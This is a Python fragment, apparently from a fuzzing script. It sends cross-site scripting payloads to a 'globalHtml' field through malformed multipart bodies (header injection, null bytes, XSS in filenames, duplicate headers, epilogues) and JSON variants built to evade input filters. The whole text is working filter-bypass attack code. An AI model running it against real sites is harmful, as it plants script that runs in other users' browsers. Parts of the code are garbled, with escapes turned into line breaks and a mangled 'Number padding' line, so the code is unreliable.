# C2: Multipart edge cases
for xss in [XSS_S, XSS_IMG]:
    # Boundary with maximum length (70 chars per RFC)
    long_bound = "A" * 70
    multipart(long_bound, [("globalHtml", xss, "")], label="long-boundary")
    
    # Boundary with minimum (1 char)
    multipart("x", [("globalHtml", xss, "")], label="short-boundary")
    
    # Content-Disposition name with special chars
    multipart("cdbound", [(f'globalHtml";injected="true', xss, "")], label="cd-inject")
    multipart("cdbound2", [('globalHtml\x00extra', xss, "")], label="cd-null")
    
    # Content-Disposition with filename containing XSS
    bound = "fnbound"
    body = (
        f"--{bound}
"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"{xss}\"
"
        f"Content-Type: text/html

"
        f"{xss}
"
        f"--{bound}--
"
    ).encode('utf-8', errors='replace')
    post_raw(body, ct=f"multipart/form-data; boundary={bound}", label="filename-xss")
    
    # Multiple Content-Disposition headers
    bound = "mcdbound"
    body = (
        f"--{bound}
"
        f"Content-Disposition: form-data; name=\"safe\"
"
        f"Content-Disposition: form-data; name=\"globalHtml\"

"
        f"{xss}
"
        f"--{bound}--
"
    ).encode()
    post_raw(body, ct=f"multipart/form-data; boundary={bound}", label="dup-cd")
    
    # Preamble before first boundary (RFC allows)
    bound = "preamblebound"
    body = (
        f"This is the preamble and should be ignored
"
        f"--{bound}
"
        f"Content-Disposition: form-data; name=\"globalHtml\"

"
        f"{xss}
"
        f"--{bound}--
"
    ).encode()
    post_raw(body, ct=f"multipart/form-data; boundary={bound}", label="preamble")
    
    # Epilogue after final boundary
    bound = "epiloguebound"
    body = (
        f"--{bound}
"
        f"Content-Disposition: form-data; name=\"globalHtml\"

"
        f"{xss}
"
        f"--{bound}--
"
        f"Epilogue text with {xss}
"
    ).encode('utf-8', errors='replace')
    post_raw(body, ct=f"multipart/form-data; boundary={bound}", label="epilogue")

# C3: JSON edge cases
for xss in [XSS_S, XSS_IMG]:
    json_edges = [
        # Unicode escapes in key
        f'{{"\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0048\\u0074\\u006d\\u006c": "{xss}"}}',
        # Nested objects
        f'{{"a":{{"globalHtml": "{xss}"}}}}',
        # Array value
        f'{{"globalHtml": ["{xss}"]}}',
        # Number padding
        f'{{"globalHtml": "{xss}

A"*1000)}globalHtml": "{xss}"}}',
        # Whitespace abuse
        f'  	
{{"globalHtml"  	
:  	
"{xss}"  	
}}  ',
        # Escaped quotes in value
        f'{{"globalHtml": "{xss.replace(chr(34), chr(92)+chr(34))}"}}',
    ]
    for jbody in json_edges:
        post_raw(jbody.encode('utf-8', errors='replace'), ct="application/json", label="json-edge")

print(f"  Grammar fuzzing done: {total} total")
